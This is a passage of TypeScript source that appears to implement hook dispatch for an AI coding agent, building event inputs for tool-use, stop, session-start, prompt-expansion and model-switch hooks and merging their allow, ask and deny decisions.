  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  requestPrompt?: (
    sourceName: string,
    toolInputSummary?: string | null,
  ) => (request: PromptRequest) => Promise<PromptResponse>,
  toolInputSummary?: string | null,
  tiers?: { managedHooksOnly?: boolean; managedHooksExcluded?: boolean },
): AsyncGenerator<AggregatedHookResult> {
  if (shouldSkipJsonToolHooks(toolName, toolUseContext)) {
    return
  }
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  const replay = !tiers?.managedHooksOnly
    ? matchToolCallManagedPass(
        toolUseContext.managedPass as ToolCallManagedPass | undefined,
        toolUseID,
        toolInput,
      )
    : undefined
  if (replay !== undefined) {
    for (const item of replay.yields) {
      yield item as AggregatedHookResult
    }
    // Uat separates the managed decision from replayable diagnostics. Keep
    // that decision as a floor while the excluded user chain runs.
    let decision: AggregatedHookResult =
      replay.result.deny !== undefined
        ? {
            permissionBehavior: 'deny',
            hookPermissionDecisionReason: replay.result.deny,
          }
        : replay.result.ask !== undefined
          ? {
              permissionBehavior: 'ask',
              hookPermissionDecisionReason: replay.result.ask,
            }
          : replay.result.allow === true
            ? { permissionBehavior: 'allow' }
            : {}
    const rank = (behavior: AggregatedHookResult['permissionBehavior']) =>
      behavior === 'deny'
        ? 3
        : behavior === 'ask'
          ? 2
          : behavior === 'allow'
            ? 1
            : 0
    if (replay.result.additionalContext?.length) {
      yield { additionalContexts: replay.result.additionalContext }
    }
    for await (const item of executeHooks({
      hookInput: {
        ...createBaseHookInput(permissionMode, undefined, toolUseContext),
        hook_event_name: 'PreToolUse' as const,
        tool_name: toolName,
        ...getToolHookMcpMetadata(toolName, toolUseContext),
        tool_input: toolInput,
        tool_use_id: toolUseID,
      },
      toolUseID,
      matchQuery: toolName,
      signal,
      timeoutMs,
      toolUseContext,
      requestPrompt,
      toolInputSummary,
      managedHooksExcluded: true,
    })) {
      if (rank(item.permissionBehavior) > rank(decision.permissionBehavior)) {
        decision = {
          permissionBehavior: item.permissionBehavior,
          hookPermissionDecisionReason: item.hookPermissionDecisionReason,
          hookSource: item.hookSource,
        }
      }
      // Defer has its own latch in the core consumer; diagnostics and input
      // rewrites must also retain their original ordering.
      const {
        permissionBehavior,
        hookPermissionDecisionReason: _reason,
        ...rest
      } = item
      if (permissionBehavior === 'defer') yield item
      else yield rest
    }
    if (decision.permissionBehavior !== undefined) yield decision
    return
  }
  // gold Rze @185182837: early-return only when settings/session AND
  // classic.PreToolUse function-hooks are both absent. hasHookForEvent is
  // gold hT (settings/session); Vp("classic.PreToolUse") is hasMatchingFunctionHook.
  if (
    !tiers?.managedHooksOnly &&
    !hasHookForEvent('PreToolUse', appState, sessionId) &&
    !hasMatchingFunctionHook('PreToolUse')
  ) {
    return
  }

  logForDebugging(`executePreToolHooks called for tool: ${toolName}`, {
    level: 'verbose',
  })

  // gold JSON stdin has tool_name only. densable tVn/uo adds `tool` on the
  // function-hook event record (executeHooks eventRecord), not settings stdin.
  const hookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PreToolUse' as const,
    tool_name: toolName,
    ...getToolHookMcpMetadata(toolName, toolUseContext),
    tool_input: toolInput,
    tool_use_id: toolUseID,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,
    signal,
    timeoutMs,
    toolUseContext,
    requestPrompt,
    toolInputSummary,
    managedHooksOnly: tiers?.managedHooksOnly,
    managedHooksExcluded: tiers?.managedHooksExcluded,
  })
}

/**
 * Execute post-tool hooks if configured
 * @param toolName The name of the tool (e.g., 'Write', 'Edit', 'Bash')
 * @param toolUseID The ID of the tool use
 * @param toolInput The input that was passed to the tool
 * @param toolResponse The response from the tool
 * @param toolUseContext ToolUseContext for prompt-based hooks
 * @param permissionMode Optional permission mode from toolPermissionContext
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and blocking errors for automated feedback
 */
export async function* executePostToolHooks<ToolInput, ToolResponse>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  toolResponse: ToolResponse,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  durationMs?: number,
  tiers?: { managedHooksOnly?: boolean; managedHooksExcluded?: boolean },
): AsyncGenerator<AggregatedHookResult> {
  if (shouldSkipJsonToolHooks(toolName, toolUseContext)) {
    return
  }
  const hookInput: PostToolUseHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PostToolUse',
    tool_name: toolName,
    ...getToolHookMcpMetadata(toolName, toolUseContext),
    tool_input: toolInput,
    tool_response: toolResponse,
    duration_ms: durationMs,
    tool_use_id: toolUseID,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,
    signal,
    timeoutMs,
    toolUseContext,
    managedHooksOnly: tiers?.managedHooksOnly,
    managedHooksExcluded: tiers?.managedHooksExcluded,
  })
}

/**
 * Execute post-tool-use-failure hooks if configured
 * @param toolName The name of the tool (e.g., 'Write', 'Edit', 'Bash')
 * @param toolUseID The ID of the tool use
 * @param toolInput The input that was passed to the tool
 * @param error The error message from the failed tool call
 * @param toolUseContext ToolUseContext for prompt-based hooks
 * @param isInterrupt Whether the tool was interrupted by user
 * @param permissionMode Optional permission mode from toolPermissionContext
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and blocking errors
 */
export async function* executePostToolUseFailureHooks<ToolInput>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  error: string,
  toolUseContext: ToolUseContext,
  isInterrupt?: boolean,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  durationMs?: number,
): AsyncGenerator<AggregatedHookResult> {
  if (shouldSkipJsonToolHooks(toolName, toolUseContext)) {
    return
  }
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  if (!hasHookForEvent('PostToolUseFailure', appState, sessionId)) {
    return
  }

  const hookInput: PostToolUseFailureHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PostToolUseFailure',
    tool_name: toolName,
    ...getToolHookMcpMetadata(toolName, toolUseContext),
    tool_input: toolInput,
    tool_use_id: toolUseID,
    error,
    is_interrupt: isInterrupt,
    duration_ms: durationMs,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,
    signal,
    timeoutMs,
    toolUseContext,
  })
}

/**
 * densable Acn — PostToolBatch after every tool in a batch has resolved.
 * Gold does not pass matchQuery (d0e has no PostToolBatch case).
 */
export async function* executePostToolBatchHooks(
  toolCalls: Array<{
    tool_name: string
    tool_input: unknown
    tool_use_id: string
    tool_response?: unknown
  }>,
  toolUseID: string,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  if (!hasHookForEvent('PostToolBatch', appState, sessionId)) {
    return
  }

  const hookInput: PostToolBatchHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PostToolBatch',
    tool_calls: toolCalls,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    signal,
    timeoutMs,
    toolUseContext,
  })
}

export async function* executePermissionDeniedHooks<ToolInput>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  reason: string,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  if (!hasHookForEvent('PermissionDenied', appState, sessionId)) {
    return
  }

  const hookInput: PermissionDeniedHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PermissionDenied',
    tool_name: toolName,
    ...getToolHookMcpMetadata(toolName, toolUseContext),
    tool_input: toolInput,
    tool_use_id: toolUseID,
    reason,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,
    signal,
    timeoutMs,
    toolUseContext,
  })
}

/**
 * Execute notification hooks if configured
 * @param notificationData The notification data to pass to hooks
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Promise that resolves when all hooks complete
 */
export async function executeNotificationHooks(
  notificationData: {
    message: string
    title?: string
    notificationType: string
  },
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<void> {
  const { message, title, notificationType } = notificationData
  const hookInput: NotificationHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'Notification',
    message,
    title,
    notification_type: notificationType,
  }

  await executeHooksOutsideREPL({
    hookInput,
    timeoutMs,
    matchQuery: notificationType,
    storageV5: persist.storageV5 ?? getPinnedStorageV5(),
    credentials: persist.credentials,
  })
}

export async function executeStopFailureHooks(
  lastMessage: AssistantMessage,
  toolUseContext?: ToolUseContext,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
): Promise<void> {
  // densable P$e: settingsHooksOff skips StopFailure entirely.
  if (toolUseContext?.options.settingsHooksOff === true) {
    return
  }
  const appState = toolUseContext?.getAppState()
  // executeHooksOutsideREPL hardcodes main sessionId (:2738). Agent frontmatter
  // hooks (registerFrontmatterHooks) key by agentId; gating with agentId here
  // would pass the gate but fail execution. Align gate with execution.
  const sessionId = getSessionId()
  if (!hasHookForEvent('StopFailure', appState, sessionId)) return

  const rawContent = lastMessage.message?.content
  const lastAssistantText =
    (Array.isArray(rawContent)
      ? extractTextContent(
          rawContent as readonly { readonly type: string }[],
          '\n',
        ).trim()
      : typeof rawContent === 'string'
        ? rawContent.trim()
        : '') || undefined

  // Some createAssistantAPIErrorMessage call sites omit `error` (e.g.
  // image-size at errors.ts:431). Default to 'unknown' so matcher filtering
  // at getMatchingHooks:1525 always applies.
  const error = (lastMessage.error as string | undefined) ?? 'unknown'
  const hookInput: StopFailureHookInput = {
    ...createBaseHookInput(undefined, undefined, toolUseContext),
    hook_event_name: 'StopFailure',
    error,
    error_details: lastMessage.errorDetails,
    last_assistant_message: lastAssistantText,
  }

  await executeHooksOutsideREPL({
    getAppState: toolUseContext?.getAppState,
    hookInput,
    timeoutMs,
    matchQuery: error,
    storageV5: toolUseContext?.storageV5 ?? getPinnedStorageV5(),
  })
}

/**
 * Execute stop hooks if configured.
 * densable `are` last arg `M` — default turn_end.
 */
export type StopHookPass =
  | 'turn_end'
  | 'turn_end_reactions'
  | 'blockable_turn_end'

export async function* executeStopHooks(
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  stopHookActive: boolean = false,
  subagentId?: AgentId,
  toolUseContext?: ToolUseContext,
  messages?: Message[],
  agentType?: string,
  requestPrompt?: (
    sourceName: string,
    toolInputSummary?: string | null,
  ) => (request: PromptRequest) => Promise<PromptResponse>,
  stopPass: StopHookPass = 'turn_end',
): AsyncGenerator<AggregatedHookResult> {
  const hookEvent = subagentId ? 'SubagentStop' : 'Stop'
  const appState = toolUseContext?.getAppState()
  const sessionId = toolUseContext?.agentId ?? getSessionId()
  if (!hasHookForEvent(hookEvent, appState, sessionId)) {
    return
  }
  // densable: turn_end_reactions no-ops when this session has no function Stop hooks.
  if (stopPass === 'turn_end_reactions') {
    const functionHooks = appState
      ? getSessionFunctionHooks(appState, sessionId, hookEvent).get(hookEvent)
      : undefined
    if (!functionHooks?.length) {
      return
    }
  }

  // Extract text content from the last assistant message so hooks can
  // inspect the final response without reading the transcript file.
  const lastAssistantMessage = messages
    ? getLastAssistantMessage(messages)
    : undefined
  const lastAssistantContent = lastAssistantMessage?.message?.content
  const lastAssistantText = lastAssistantMessage
    ? (Array.isArray(lastAssistantContent)
        ? extractTextContent(
            lastAssistantContent as readonly { readonly type: string }[],
            '\n',
          ).trim()
        : typeof lastAssistantContent === 'string'
          ? lastAssistantContent.trim()
          : '') || undefined
    : undefined

  const stopExtras = {
    background_tasks: snapshotStopBackgroundTasks(appState?.tasks),
    session_crons: snapshotStopSessionCrons(),
  }

  const hookInput: StopHookInput | SubagentStopHookInput = subagentId
    ? {
        ...createBaseHookInput(permissionMode, undefined, toolUseContext),
        hook_event_name: 'SubagentStop',
        stop_hook_active: stopHookActive,
        agent_id: subagentId,
        agent_transcript_path: getAgentTranscriptPath(subagentId),
        agent_type: agentType ?? '',
        last_assistant_message: lastAssistantText,
        ...stopExtras,
      }
    : {
        ...createBaseHookInput(permissionMode, undefined, toolUseContext),
        hook_event_name: 'Stop',
        stop_hook_active: stopHookActive,
        last_assistant_message: lastAssistantText,
        ...stopExtras,
      }

  // Trust check is now centralized in executeHooks()
  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal,
    timeoutMs,
    toolUseContext,
    messages,
    requestPrompt,
    skipSessionFunctionHooks: stopPass !== 'turn_end_reactions',
    sessionFunctionHooksOnly: stopPass === 'turn_end_reactions',
  })
}

/**
 * Execute TeammateIdle hooks when a teammate is about to go idle.
 * If a hook blocks (exit code 2), the teammate should continue working instead of going idle.
 * @param teammateName The name of the teammate going idle
 * @param teamName The team this teammate belongs to
 * @param permissionMode Optional permission mode
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and blocking errors
 */
export async function* executeTeammateIdleHooks(
  teammateName: string,
  teamName: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  storageV5?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: TeammateIdleHookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'TeammateIdle',
    teammate_name: teammateName,
    team_name: teamName,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal,
    timeoutMs,
    storageV5: storageV5 ?? getPinnedStorageV5(),
  })
}

/**
 * Execute TaskCreated hooks when a task is being created.
 * If a hook blocks (exit code 2), the task creation should be prevented and feedback returned.
 * @param taskId The ID of the task being created
 * @param taskSubject The subject/title of the task
 * @param taskDescription Optional description of the task
 * @param teammateName Optional name of the teammate creating the task
 * @param teamName Optional team name
 * @param permissionMode Optional permission mode
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @param toolUseContext Optional ToolUseContext for resolving appState and sessionId
 * @returns Async generator that yields progress messages and blocking errors
 */
export async function* executeTaskCreatedHooks(
  taskId: string,
  taskSubject: string,
  taskDescription?: string,
  teammateName?: string,
  teamName?: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  toolUseContext?: ToolUseContext,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: TaskCreatedHookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'TaskCreated',
    task_id: taskId,
    task_subject: taskSubject,
    task_description: taskDescription,
    teammate_name: teammateName,
    team_name: teamName,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal,
    timeoutMs,
    toolUseContext,
  })
}

/**
 * Execute TaskCompleted hooks when a task is being marked as completed.
 * If a hook blocks (exit code 2), the task completion should be prevented and feedback returned.
 * @param taskId The ID of the task being completed
 * @param taskSubject The subject/title of the task
 * @param taskDescription Optional description of the task
 * @param teammateName Optional name of the teammate completing the task
 * @param teamName Optional team name
 * @param permissionMode Optional permission mode
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @param toolUseContext Optional ToolUseContext for resolving appState and sessionId
 * @returns Async generator that yields progress messages and blocking errors
 */
export async function* executeTaskCompletedHooks(
  taskId: string,
  taskSubject: string,
  taskDescription?: string,
  teammateName?: string,
  teamName?: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  toolUseContext?: ToolUseContext,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: TaskCompletedHookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'TaskCompleted',
    task_id: taskId,
    task_subject: taskSubject,
    task_description: taskDescription,
    teammate_name: teammateName,
    team_name: teamName,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal,
    timeoutMs,
    toolUseContext,
  })
}

/**
 * Execute start hooks if configured
 * @param prompt The user prompt that will be passed to the tool
 * @param permissionMode Permission mode from toolPermissionContext
 * @param toolUseContext ToolUseContext for prompt-based hooks
 * @returns Async generator that yields progress messages and hook results
 */
export async function* executeUserPromptSubmitHooks(
  prompt: string,
  permissionMode: string,
  toolUseContext: ToolUseContext,
  requestPrompt?: (
    sourceName: string,
    toolInputSummary?: string | null,
  ) => (request: PromptRequest) => Promise<PromptResponse>,
): AsyncGenerator<AggregatedHookResult> {
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  if (!hasHookForEvent('UserPromptSubmit', appState, sessionId)) {
    return
  }

  const hookInput: UserPromptSubmitHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'UserPromptSubmit',
    prompt,
    session_title: getCurrentSessionTitle(getSessionId()),
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal: toolUseContext.abortController.signal,
    timeoutMs: USER_PROMPT_SUBMIT_HOOK_TIMEOUT_MS,
    toolUseContext,
    requestPrompt,
  })
}

/**
 * densable AMr — UserPromptExpansion command hooks.
 */
export async function* executeUserPromptExpansionHooks(
  expansionType: 'slash_command' | 'mcp_prompt',
  commandName: string,
  commandArgs: string,
  commandSource: string | undefined,
  prompt: string,
  permissionMode: string,
  toolUseContext: ToolUseContext,
): AsyncGenerator<AggregatedHookResult> {
  const appState = toolUseContext.getAppState()
  const sessionId = toolUseContext.agentId ?? getSessionId()
  if (!hasHookForEvent('UserPromptExpansion', appState, sessionId)) {
    return
  }

  const hookInput: UserPromptExpansionHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'UserPromptExpansion',
    expansion_type: expansionType,
    command_name: commandName,
    command_args: commandArgs,
    command_source: commandSource,
    prompt,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    signal: toolUseContext.abortController.signal,
    timeoutMs: TOOL_HOOK_EXECUTION_TIMEOUT_MS,
    toolUseContext,
  })
}

export type UserPromptExpansionMessage =
  | UserMessage
  | AssistantMessage
  | AttachmentMessage
  | SystemMessage
  | ProgressMessage

export type UserPromptExpansionBlocked<T> = {
  blocked: {
    messages: UserPromptExpansionMessage[]
    shouldQuery: false
    resultText: string
    command: T
  }
}

export type UserPromptExpansionOk = {
  hookMessages: UserPromptExpansionMessage[]
}

/**
 * densable Ze — run UserPromptExpansion around a slash / MCP prompt expansion.
 */
export async function runUserPromptExpansionHook<
  T extends { name: string; source?: string },
>(
  command: T,
  args: string,
  toolUseContext: ToolUseContext,
): Promise<UserPromptExpansionBlocked<T> | UserPromptExpansionOk> {
  const hookMessages: UserPromptExpansionMessage[] = []
  const prompt = args ? `/${command.name} ${args}` : `/${command.name}`
  try {
    const permissionMode =
      toolUseContext.getAppState().toolPermissionContext.mode
    for await (const result of executeUserPromptExpansionHooks(
      command.source === 'mcp' ? 'mcp_prompt' : 'slash_command',
      command.name,
      args,
      command.source,
      prompt,
      permissionMode,
      toolUseContext,
    )) {
      if (result.message?.type === 'progress') {
        continue
      }
      if (result.blockingError) {
        const blockingMessage = getUserPromptExpansionHookBlockingMessage(
          result.blockingError,
        )
        const blockText = result.suppressOriginalPrompt
          ? blockingMessage
          : `${blockingMessage}\n\nOriginal prompt: ${prompt}`
        return {
          blocked: {
            messages: [
              createSystemMessage(blockText, 'warning', undefined, true),
            ],
            shouldQuery: false,
            resultText: blockText,
            command,
          },
        }
      }
      if (result.preventContinuation) {
        const stopText = result.stopReason
          ? `Operation stopped by hook: ${result.stopReason}`
          : 'Operation stopped by hook'
        return {
          blocked: {
            messages: [
              createUserMessage({ content: stopText, isMeta: true }),
              createSystemMessage(stopText, 'warning', undefined, true),
            ],
            shouldQuery: false,
            resultText: stopText,
            command,
          },
        }
      }
      if (result.additionalContexts?.length) {
        hookMessages.push(
          createAttachmentMessage({
            type: 'hook_additional_context',
            content: result.additionalContexts.map(escapeSystemReminderTags),
            hookName: 'UserPromptExpansion',
            toolUseID: `hook-${randomUUID()}`,
            hookEvent: 'UserPromptExpansion',
          }),
        )
      }
      const hookMessage = result.message
      if (
        hookMessage &&
        !(
          hookMessage.type === 'attachment' &&
          hookMessage.attachment?.type === 'hook_success' &&
          hookMessage.attachment.content === ''
        )
      ) {
        hookMessages.push(hookMessage as UserPromptExpansionMessage)
      }
    }
  } catch (err) {
    if (!(err instanceof ControlStreamClosedError)) {
      throw err
    }
    logForDebugging(
      'UserPromptExpansion hooks cancelled (control stream closed)',
    )
  }
  return { hookMessages }
}

/**
 * Execute session start hooks if configured
 * @param source The source of the session start (startup, resume, clear)
 * @param sessionId Optional The session id to use as hook input
 * @param agentType Optional The agent type (from --agent flag) running this session
 * @param model Optional The model being used for this session
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and hook results
 */
/** Official `ees` — keepalive holder id (refcount only, not mainLoopRefcount). */
const STARTUP_HOOK_HOLD = 'startup-hook-hold'

type SessionStartLateLoadPayload = {
  surface: string | null
  isInteractive: boolean
}

export type PluginHookMatcherIdentity = {
  pluginId: string
  pluginName: string
}

export type SessionStartHookExecutionOptions = {
  newPluginsOnly?: {
    owed: (
      plugins: readonly PluginHookMatcherIdentity[],
    ) => PluginHookMatcherIdentity[]
  }
  onMatched?: (
    matchedPlugins: readonly PluginHookMatcherIdentity[],
    matchedCount: number,
  ) => void
  orphaned?: AbortSignal
  storageV5?: unknown
}

/**
 * densable `hn`. Unique English:
 * `session.start: raised for ${name} (loaded later)`.
 * Never export minify `hn`.
 */
function raiseSessionStartForLaterLoadedModules(
  mods: readonly LoadedFunctionHooksModule[],
  seen: WeakSet<LoadedFunctionHooksModule>,
  payload: SessionStartLateLoadPayload,
  signal?: AbortSignal,
  orphaned?: AbortSignal,
): void {
  if (signal?.aborted || orphaned?.aborted) return
  const effectiveSignal =
    signal && orphaned
      ? AbortSignal.any([signal, orphaned])
      : (signal ?? orphaned)
  for (const mod of mods) {
    if (signal?.aborted || orphaned?.aborted) return
    if (seen.has(mod)) continue
    seen.add(mod)
    if (!hasMatchingFunctionHook('session.start', undefined, [mod])) continue
    logForDebugging(`session.start: raised for ${mod.name} (loaded later)`)
    const name = mod.name
    const cwd = getCwd()
    Promise.resolve()
      .then(() => {
        if (signal?.aborted || orphaned?.aborted) return
        return runFunctionHookChain(
          'session.start',
          {
            cwd,
            surface: payload.surface,
            isInteractive: payload.isInteractive,
          },
          async () => ({ cwd }),
          name,
          undefined,
          effectiveSignal ? { signal: effectiveSignal } : undefined,
        )
      })
      .catch((err: unknown) => {
        logForDebugging(
          `session.start: failed for ${name}: ${errorMessage(err)}`,
          { level: 'error' },
        )
      })
  }
}

/** densable `yn` `Azn.set`. Never export minify `yn`. */
function armLaterLoadedSessionStart(
  payload: SessionStartLateLoadPayload,
  signal?: AbortSignal,
  orphaned?: AbortSignal,
): void {
  const seen = new WeakSet<LoadedFunctionHooksModule>(
    getLoadedFunctionHooksModules(),
  )
  setLaterLoadedSessionStart(mods =>
    raiseSessionStartForLaterLoadedModules(
      mods,
      seen,
      payload,
      signal,
      orphaned,
    ),
  )
}

export async function* executeSessionStartHooks(
  // densable 2.1.214 #47: source enum includes "fork"
  source: 'startup' | 'resume' | 'clear' | 'compact' | 'fork',
  sessionId?: string,
  agentType?: string,
  model?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  forceSyncExecution?: boolean,
  messages?: Message[],
  sessionStartOptions?: SessionStartHookExecutionOptions,
): AsyncGenerator<AggregatedHookResult> {
  const orphaned = sessionStartOptions?.orphaned
  const storageV5 = sessionStartOptions?.storageV5 ?? getPinnedStorageV5()
  if (orphaned?.aborted) {
    return
  }
  const effectiveSignal =
    signal && orphaned
      ? AbortSignal.any([signal, orphaned])
      : (signal ?? orphaned)
  const resolvedId = sessionId ?? getSessionId()
  const resumeFields =
    (source === 'resume' || source === 'fork') && messages
      ? KSn(messages, model, resolvedId)
      : {}
  const hookInput: SessionStartHookInput = {
    ...createBaseHookInput(undefined, sessionId),
    hook_event_name: 'SessionStart',
    source,
    agent_type: agentType,
    model,
    session_title: getCurrentSessionTitle(asSessionId(resolvedId)),
    ...resumeFields,
  }

  // Official flo: ihr("hook_exec", ees) / try yield* S2 / finally shr
  startSessionActivity('hook_exec', STARTUP_HOOK_HOLD)
  try {
    if (
      source !== 'clear' &&
      source !== 'compact' &&
      !isBareMode() &&
      !shouldDisableAllHooksIncludingManaged()
    ) {
      const isInteractive = !getIsNonInteractiveSession()
      const cwd = getCwd()
      const surface = isInteractive ? 'terminal' : null
      // densable leftover `yn` — WeakSet snapshot + Azn.set, then session.start.
      armLaterLoadedSessionStart({ surface, isInteractive }, signal, orphaned)
      if (hasMatchingFunctionHook('session.start')) {
        logForDebugging(
          `session.start: raised (surface ${surface ?? 'none'}, ${isInteractive ? 'interactive' : 'not interactive'})`,
        )
        try {
          await runFunctionHookChain(
            'session.start',
            {
              cwd,
              surface,
              isInteractive,
            },
            async () => ({ cwd }),
            undefined,
            undefined,
            effectiveSignal ? { signal: effectiveSignal } : undefined,
          )
        } catch (err) {
          logForDebugging(`session.start: failed: ${errorMessage(err)}`, {
            level: 'error',
          })
        }
        if (getPluginRegisteredCommands().length > 0) {
          const { clearCommandMemoizationCaches } = await import(
            '../commands.js'
          )
          clearCommandMemoizationCaches()
          try {
            const { notifySkillsInvalidated } = await import(
              './skills/skillChangeDetector.js'
            )
            notifySkillsInvalidated()
          } catch {
            // optional in isolated tests
          }
        }
      }
    }
    if (orphaned?.aborted) {
      return
    }
    yield* executeHooks({
      hookInput,
      toolUseID: randomUUID(),
      matchQuery: source,
      signal: effectiveSignal,
      timeoutMs,
      forceSyncExecution,
      sessionStartOptions,
      storageV5,
    })
  } finally {
    invalidateSessionEnvCache()
    stopSessionActivity('hook_exec', STARTUP_HOOK_HOLD)
  }
}

export type PreModelSwitchDecision =
  | { decision: 'block'; reason: string; messages: string[] }
  | { decision: 'ask'; reason: string | undefined; messages: string[] }
  | { decision: 'proceed'; skipConfirm: boolean; messages: string[] }

/** densable dD */
function hasPreModelSwitchHooks(session: { id: string }): boolean {
  if (nVn()) return true
  return hasHookForEvent('PreModelSwitch', undefined, session.id)
}

/**
 * densable hdt — PreModelSwitch. yield* executeHooks (local z_).
 * Block / ask / proceed+skipConfirm per gold-a.
 */
export async function executePreModelSwitchHooks(
  switchTo: ModelSwitchRequest,
  messages: Message[] = [],
  opts: { signal?: AbortSignal; timeoutMs?: number } = {},
): Promise<PreModelSwitchDecision> {
  const session = getModelSwitchSession()
  const collected: string[] = []
  await Osn()
  if (await Lsn(true)) {
    return {
      decision: 'block',
      reason:
        'plugin hooks could not be loaded, so PreModelSwitch hooks could not be checked; see the debug log',
      messages: collected,
    }
  }
  if (!hasPreModelSwitchHooks(session)) {
    return { decision: 'proceed', skipConfirm: false, messages: collected }
  }
  if (cre(switchTo.toModel)) await hJ(switchTo.toModel)
  const contextTokens = contextTokensAfterCompact(messages)
  const hookInput: PreModelSwitchHookInput = {
    ...createBaseHookInput(undefined, session.id),
    hook_event_name: 'PreModelSwitch',
    from_model: switchTo.fromModel,
    to_model: switchTo.toModel,
    requested_model: switchTo.requestedModel,
    source: switchTo.source,
    ...Ewe(switchTo.toModel, contextTokens),
  }
  const matchQuery = LOe(switchTo.toModel) ? switchTo.toModel : undefined
  let blockReason: string | undefined
  let askReason: string | undefined
  let asked = false
  let skipConfirm = false
  void Kle.of(session)
  try {
    for await (const result of executeHooks({
      hookInput,
      toolUseID: modelSwitchToolUseId(),
      matchQuery,
      signal: opts.signal,
      timeoutMs: opts.timeoutMs ?? Hye,
    })) {
      yBn(result.message, collected)
      const attachment =
        result.message?.type === 'attachment'
          ? result.message.attachment
          : undefined
      if (
        attachment?.type === 'hook_cancelled' &&
        !opts.signal?.aborted &&
        attachment.hookName
      ) {
        blockReason ??= `PreModelSwitch hook ${attachment.hookName} did not respond before its timeout`
      }
      if (result.blockingError) {
        blockReason ??= result.blockingError.blockingError
      } else if (result.permissionBehavior === 'ask') {
        asked = true
        askReason ??= result.hookPermissionDecisionReason
      } else if (result.permissionBehavior === 'allow') {
        skipConfirm = true
      }
    }
  } catch (err) {
    const closed = err instanceof ControlStreamClosedError
    logError(
      new Error(
        `PreModelSwitch hooks did not complete: ${closed ? 'control stream closed' : String(err)}`,
      ),
    )
    blockReason ??= closed
      ? 'PreModelSwitch hooks were cancelled (the control stream closed) before answering'
      : 'a PreModelSwitch hook failed before answering'
  }
  if (blockReason !== undefined) {
    return { decision: 'block', reason: blockReason, messages: collected }
  }
  if (asked) {
    return { decision: 'ask', reason: askReason, messages: collected }
